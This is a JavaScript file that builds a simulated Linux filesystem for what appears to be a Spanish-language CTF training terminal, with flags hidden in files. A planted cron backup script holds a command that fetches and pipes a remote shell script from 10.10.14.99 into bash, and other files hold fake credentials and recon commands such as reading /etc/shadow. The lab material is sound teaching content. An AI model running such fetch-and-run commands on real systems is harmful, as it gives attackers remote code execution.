// ═══════════════════════════════════════════════════════════════════════════
// FILESYSTEM.JS — Sistema de archivos virtual Linux
// Simula una jerarquía FHS realista para la terminal interactiva
// ═══════════════════════════════════════════════════════════════════════════

const VirtualFS = (() => {
  // Tipos de nodo
  const DIR = 'dir';
  const FILE = 'file';

  // ── SISTEMA DE ARCHIVOS COMPLETO ────────────────────────────────────
  // Cada nodo: { type, children?, content?, permissions?, owner?, group?, size? }
  const fileSystem = {
    type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
    children: {
      'bin': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'ls':     { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 142144, content: '' },
          'cat':    { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 43416, content: '' },
          'grep':   { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 203688, content: '' },
          'bash':   { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 1183448, content: '' },
          'pwd':    { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 35328, content: '' },
          'echo':   { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 35328, content: '' },
          'find':   { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 280496, content: '' },
          'chmod':  { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 64448, content: '' },
        }
      },
      'etc': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'passwd': {
            type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 2847,
            content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
user:x:1000:1000:Linux Student:/home/user:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
postgres:x:26:26:PostgreSQL Server:/var/lib/postgresql:/bin/bash`
          },
          'shadow': {
            type: FILE, permissions: '-rw-r-----', owner: 'root', group: 'shadow', size: 1284,
            content: `root:$6$rounds=656000$xyz...hash:19723:0:99999:7:::
user:$6$rounds=656000$abc...hash:19723:0:99999:7:::`
          },
          'hosts': {
            type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 221,
            content: `127.0.0.1\tlocalhost
127.0.1.1\tlinux-lab
::1\t\tlocalhost ip6-localhost ip6-loopback
ff02::1\t\tip6-allnodes
ff02::2\t\tip6-allrouters

# Servidores internos
192.168.1.10\tdb-server
192.168.1.20\tweb-server
10.10.14.5\tvpn-gateway`
          },
          'hostname': {
            type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 10,
            content: 'linux-lab'
          },
          'os-release': {
            type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 390,
            content: `NAME="Ubuntu"
VERSION="24.04 LTS (Noble Numbat)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 24.04 LTS"
VERSION_ID="24.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"`
          },
          'resolv.conf': {
            type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 83,
            content: `nameserver 8.8.8.8
nameserver 8.8.4.4
search localdomain`
          },
          'crontab': {
            type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 722,
            content: `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /opt/scripts/backup.sh`
          },
          'sudoers': {
            type: FILE, permissions: '-r--r-----', owner: 'root', group: 'root', size: 669,
            content: `# /etc/sudoers
Defaults\tenv_reset
Defaults\tmail_badpass
Defaults\tsecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

root\tALL=(ALL:ALL) ALL
%admin\tALL=(ALL) ALL
%sudo\tALL=(ALL:ALL) ALL
user\tALL=(ALL) NOPASSWD: /usr/bin/nmap`
          },
          'ssh': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
            children: {
              'sshd_config': {
                type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 3287,
                content: `# SSH Server Configuration
# flag{ssh_config_found}
Port 22
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication yes
X11Forwarding yes
UsePAM yes
AllowUsers user admin
# WARN: default port, consider changing`
              }
            }
          }
        }
      },
      'home': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'user': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'user', group: 'user',
            children: {
              '.bashrc': {
                type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 3771,
                content: `# ~/.bashrc: executed by bash for non-login shells
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac
HISTCONTROL=ignoreboth
HISTSIZE=1000
PS1='\\[\\033[01;32m\\]user@linux-lab\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias grep='grep --color=auto'
export PATH="$HOME/.local/bin:$PATH"`
              },
              '.bash_history': {
                type: FILE, permissions: '-rw-------', owner: 'user', group: 'user', size: 456,
                content: `ls -la
cd /etc
cat passwd
whoami
sudo nmap -sV 192.168.1.1
find / -perm -4000 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
cat /etc/shadow`
              },
              '.secret': {
                type: FILE, permissions: '-rw-------', owner: 'user', group: 'user', size: 20,
                content: 'flag{linux_master}'
              },
              '.ssh': {
                type: DIR, permissions: 'drwx------', owner: 'user', group: 'user',
                children: {
                  'id_rsa.pub': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 568,
                    content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... user@linux-lab'
                  },
                  'known_hosts': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 444,
                    content: '192.168.1.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...'
                  }
                }
              },
              'documentos': {
                type: DIR, permissions: 'drwxr-xr-x', owner: 'user', group: 'user',
                children: {
                  'notas.txt': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 245,
                    content: `Notas del curso de Linux:
1. Aprender comandos básicos
2. Entender permisos rwx
3. Dominar bash scripting
4. Practicar con CTFs
5. Nunca usar rm -rf sin pensar`
                  },
                  'nota_cifrada.txt': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 89,
                    content: `Mensaje codificado en Base64:
ZmxhZ3tiYXNlNjRfZGVjb2RlZH0=

Pista: usa 'echo <texto> | base64 -d' para decodificar`
                  },
                  'passwords_backup.txt': {
                    type: FILE, permissions: '-rw-------', owner: 'user', group: 'user', size: 178,
                    content: `# BACKUP DE CREDENCIALES - NO COMPARTIR
admin:SuperSecretPass123!
db_user:mysql_p@ssw0rd
ftp_user:ftp_access_2024
root_panel:r00t_4dm1n_2024
# flag{credentials_exposed}
# TODO: mover a gestor de contraseñas`
                  }
                }
              },
              'scripts': {
                type: DIR, permissions: 'drwxr-xr-x', owner: 'user', group: 'user',
                children: {
                  'scan.sh': {
                    type: FILE, permissions: '-rwxr-xr-x', owner: 'user', group: 'user', size: 312,
                    content: `#!/bin/bash
# Script de escaneo básico
echo "[*] Escaneando host..."
for port in 21 22 80 443 8080; do
  echo "Probando puerto $port..."
done
echo "[+] Escaneo completado"`
                  },
                  'backup.sh': {
                    type: FILE, permissions: '-rwxr-xr-x', owner: 'user', group: 'user', size: 156,
                    content: `#!/bin/bash
# Backup automático
DATE=$(date +%Y%m%d)
tar -czf /tmp/backup_$DATE.tar.gz ~/documentos/
echo "Backup completado: backup_$DATE.tar.gz"`
                  }
                }
              },
              'descargas': {
                type: DIR, permissions: 'drwxr-xr-x', owner: 'user', group: 'user',
                children: {
                  'rockyou_sample.txt': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 156,
                    content: `123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon`
                  }
                }
              }
            }
          }
        }
      },
      'root': {
        type: DIR, permissions: 'drwx------', owner: 'root', group: 'root',
        children: {
          '.flag_root': {
            type: FILE, permissions: '-rw-------', owner: 'root', group: 'root', size: 29,
            content: 'flag{root_access_granted}'
          },
          'notas_admin.txt': {
            type: FILE, permissions: '-rw-------', owner: 'root', group: 'root', size: 200,
            content: `[ADMIN] Recordatorio:
- Actualizar firewall reglas
- Revisar logs de auth.log
- Cambiar credenciales por defecto del servidor web
- El usuario "user" tiene acceso sudo limitado a nmap`
          }
        }
      },
      'tmp': {
        type: DIR, permissions: 'drwxrwxrwt', owner: 'root', group: 'root',
        children: {
          'debug.log': {
            type: FILE, permissions: '-rw-r--r--', owner: 'user', group: 'user', size: 320,
            content: `[2025-01-15 10:30:01] DEBUG: Application started
[2025-01-15 10:30:02] INFO: Connecting to database...
[2025-01-15 10:30:02] INFO: Connection established
[2025-01-15 10:31:15] WARNING: High memory usage detected
[2025-01-15 10:35:44] ERROR: Failed login attempt from 10.10.14.99`
          }
        }
      },
      'var': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'log': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
            children: {
              'syslog': {
                type: FILE, permissions: '-rw-r-----', owner: 'syslog', group: 'adm', size: 4521,
                content: `Jan 15 10:30:01 linux-lab systemd[1]: Started Session 1 of user user.
Jan 15 10:30:02 linux-lab kernel: [  0.000000] Linux version 6.5.0-14-generic
Jan 15 10:30:15 linux-lab sshd[1234]: Accepted publickey for user from 192.168.1.5
Jan 15 10:31:44 linux-lab sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/nmap
Jan 15 10:35:02 linux-lab CRON[5678]: (root) CMD (/opt/scripts/backup.sh)`
              },
              'auth.log': {
                type: FILE, permissions: '-rw-r-----', owner: 'syslog', group: 'adm', size: 3892,
                content: `Jan 15 08:00:01 linux-lab sshd[890]: Accepted password for user from 192.168.1.5 port 54321
Jan 15 08:15:33 linux-lab sshd[891]: Failed password for admin from 10.10.14.99 port 44532
Jan 15 08:15:35 linux-lab sshd[891]: Failed password for admin from 10.10.14.99 port 44532
Jan 15 08:15:38 linux-lab sshd[891]: Failed password for admin from 10.10.14.99 port 44532
Jan 15 08:16:01 linux-lab sshd[891]: Failed password for root from 10.10.14.99 port 44533
Jan 15 08:16:03 linux-lab sshd[891]: Failed password for root from 10.10.14.99 port 44533
Jan 15 09:00:00 linux-lab sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/nmap -sV 192.168.1.1
Jan 15 10:30:15 linux-lab sshd[1234]: Accepted publickey for user from 192.168.1.5 port 55432
Jan 15 10:30:15 linux-lab sshd[1234]: pam_unix(sshd:session): session opened for user user
Jan 15 14:22:10 linux-lab sshd[2345]: INTRUSO DETECTADO: flag{intruso_detectado} - IP sospechosa: 10.10.14.99`
              }
            }
          },
          'www': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'www-data', group: 'www-data',
            children: {
              'html': {
                type: DIR, permissions: 'drwxr-xr-x', owner: 'www-data', group: 'www-data',
                children: {
                  'index.html': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'www-data', group: 'www-data', size: 512,
                    content: `<!DOCTYPE html>
<html>
<head><title>Linux Lab Server</title></head>
<body>
<h1>Welcome to Linux Lab</h1>
<p>Server is running.</p>
<!-- TODO: remove debug info before prod -->
<!-- DB_HOST=localhost DB_USER=admin DB_PASS=admin123 -->
<!-- flag{html_comment_leak} -->
</body>
</html>`
                  }
                }
              }
            }
          }
        }
      },
      'usr': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'bin': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
            children: {
              'python3': { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 5765360, content: '' },
              'nmap':    { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 2862144, content: '' },
              'vim':     { type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 3562736, content: '' },
              'passwd':  { type: FILE, permissions: '-rwsr-xr-x', owner: 'root', group: 'root', size: 59976, content: 'ELF binary — SUID bit set (s in permissions: -rwsr-xr-x)\nThis binary runs as root regardless of user.\nflag{suid_privilege_escalation}\nUse "find / -perm -4000" to find SUID binaries.' },
            }
          },
          'share': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
            children: {
              'wordlists': {
                type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
                children: {
                  'common.txt': {
                    type: FILE, permissions: '-rw-r--r--', owner: 'root', group: 'root', size: 4614,
                    content: `admin
test
guest
info
backup
mysql
user
administrator
ftp
oracle`
                  }
                }
              }
            }
          }
        }
      },
      'opt': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'scripts': {
            type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
            children: {
              'backup.sh': {
                type: FILE, permissions: '-rwxr-xr-x', owner: 'root', group: 'root', size: 502,
                content: `#!/bin/bash
# System backup script
tar -czf /tmp/system_backup_$(date +%Y%m%d).tar.gz /etc/ /home/
echo "Backup completed at $(date)"

# --- INICIO PAYLOAD SOSPECHOSO ---
# Añadido por cron cada 5 minutos
# flag{cron_backdoor}
curl -s http://10.10.14.99:4444/shell.sh | bash 2>/dev/null
# --- FIN PAYLOAD ---`
              }
            }
          }
        }
      },
      'dev': {
        type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root',
        children: {
          'null':   { type: FILE, permissions: 'crw-rw-rw-', owner: 'root', group: 'root', size: 0, content: '' },
          'zero':   { type: FILE, permissions: 'crw-rw-rw-', owner: 'root', group: 'root', size: 0, content: '' },
          'random': { type: FILE, permissions: 'crw-rw-rw-', owner: 'root', group: 'root', size: 0, content: '' },
          'sda':    { type: FILE, permissions: 'brw-rw----', owner: 'root', group: 'disk', size: 0, content: '' },
          'sda1':   { type: FILE, permissions: 'brw-rw----', owner: 'root', group: 'disk', size: 0, content: '' },
        }
      },
      'proc': {
        type: DIR, permissions: 'dr-xr-xr-x', owner: 'root', group: 'root',
        children: {
          'version': {
            type: FILE, permissions: '-r--r--r--', owner: 'root', group: 'root', size: 175,
            content: 'Linux version 6.5.0-14-generic (buildd@lcy02-amd64-039) (gcc-13 (Ubuntu 13.2.0-4ubuntu3) 13.2.0)'
          },
          'cpuinfo': {
            type: FILE, permissions: '-r--r--r--', owner: 'root', group: 'root', size: 1024,
            content: `processor\t: 0
vendor_id\t: GenuineIntel
model name\t: Intel(R) Core(TM) i7-12700K
cpu MHz\t\t: 3600.000
cache size\t: 25600 KB
cpu cores\t: 12`
          },
          'meminfo': {
            type: FILE, permissions: '-r--r--r--', owner: 'root', group: 'root', size: 1432,
            content: `MemTotal:       16384000 kB
MemFree:         8234560 kB
MemAvailable:   12456780 kB
Buffers:          456780 kB
Cached:          3456780 kB
SwapTotal:       4194304 kB
SwapFree:        4194304 kB`
          }
        }
      },
      'mnt': { type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root', children: {} },
      'media': { type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root', children: {} },
      'srv': { type: DIR, permissions: 'drwxr-xr-x', owner: 'root', group: 'root', children: {} },
    }
  };

  // ── PATH UTILITIES ────────────────────────────────────────────────────

  function normalizePath(path) {
    const parts = path.split('/').filter(p => p !== '' && p !== '.');
    const resolved = [];
    for (const part of parts) {
      if (part === '..') {
        resolved.pop();
      } else {
        resolved.push(part);
      }
    }
    return '/' + resolved.join('/');
  }

  function resolvePath(cwd, inputPath) {
    if (!inputPath) return cwd;
    // Handle ~ (home directory)
    if (inputPath === '~' || inputPath === '~/') return '/home/user';
    if (inputPath.startsWith('~/')) {
      inputPath = '/home/user/' + inputPath.slice(2);
    }
    // Absolute vs relative
    if (inputPath.startsWith('/')) {
      return normalizePath(inputPath);
    }
    return normalizePath(cwd + '/' + inputPath);
  }

  function getNode(absolutePath) {
    if (absolutePath === '/') return fileSystem;
    const parts = absolutePath.split('/').filter(p => p !== '');
    let node = fileSystem;
    for (const part of parts) {
      if (!node || node.type !== DIR || !node.children || !node.children[part]) {
        return null;
      }
      node = node.children[part];
    }
    return node;
  }

  function listDir(absolutePath, showHidden = false) {
    const node = getNode(absolutePath);
    if (!node || node.type !== DIR) return null;
    const entries = Object.keys(node.children || {});
    if (!showHidden) {
      return entries.filter(e => !e.startsWith('.'));
    }
    return entries;
  }

  function readFile(absolutePath) {
    const node = getNode(absolutePath);
    if (!node) return { error: `cat: ${absolutePath}: No existe el archivo o directorio` };
    if (node.type === DIR) return { error: `cat: ${absolutePath}: Es un directorio` };
    return { content: node.content };
  }

  function getNodeInfo(absolutePath, name) {
    const node = getNode(absolutePath);
    if (!node) return null;
    const isDir = node.type === DIR;
    const childCount = isDir ? Object.keys(node.children || {}).length : 0;
    return {
      name: name,
      type: node.type,
      permissions: node.permissions || (isDir ? 'drwxr-xr-x' : '-rw-r--r--'),
      owner: node.owner || 'user',
      group: node.group || 'user',
      size: node.size || (isDir ? 4096 : (node.content || '').length),
      links: isDir ? childCount + 2 : 1,
    };
  }

  function getParentPath(absolutePath) {
    if (absolutePath === '/') return '/';
    const parts = absolutePath.split('/').filter(p => p !== '');
    parts.pop();
    return '/' + parts.join('/') || '/';
  }

  function exists(absolutePath) {
    return getNode(absolutePath) !== null;
  }

  function isDirectory(absolutePath) {
    const node = getNode(absolutePath);
    return node !== null && node.type === DIR;
  }

  // ── FIND COMMAND ────────────────────────────────────────────────────
  function findFiles(startPath, namePattern, maxResults = 20) {
    const results = [];
    const startNode = getNode(startPath);
    if (!startNode || startNode.type !== DIR) return results;

    function matchPattern(name, pattern) {
      // Simple glob: * matches anything
      const regex = new RegExp('^' + pattern.replace(/\*/g, '.*').replace(/\?/g, '.') + '$');
      return regex.test(name);
    }

    function walk(currentPath, node) {
      if (results.length >= maxResults) return;
      if (!node.children) return;
      for (const [name, child] of Object.entries(node.children)) {
        const fullPath = currentPath === '/' ? '/' + name : currentPath + '/' + name;
        if (matchPattern(name, namePattern)) {
          results.push(fullPath);
        }
        if (child.type === DIR && results.length < maxResults) {
          walk(fullPath, child);
        }
      }
    }

    walk(startPath, startNode);
    return results;
  }

  // ── GREP COMMAND ────────────────────────────────────────────────────
  function grepFile(filePath, pattern) {
    const result = readFile(filePath);
    if (result.error) return { error: result.error };
    const lines = result.content.split('\n');
    const matches = [];
    const regex = new RegExp(pattern, 'i');
    lines.forEach((line, i) => {
      if (regex.test(line)) {
        matches.push(line);
      }
    });
    return { matches };
  }

  // ── PUBLIC API ────────────────────────────────────────────────────────
  return {
    resolvePath,
    getNode,
    listDir,
    readFile,
    getNodeInfo,
    getParentPath,
    exists,
    isDirectory,
    findFiles,
    grepFile,
    normalizePath,
    DIR,
    FILE,
  };
})();
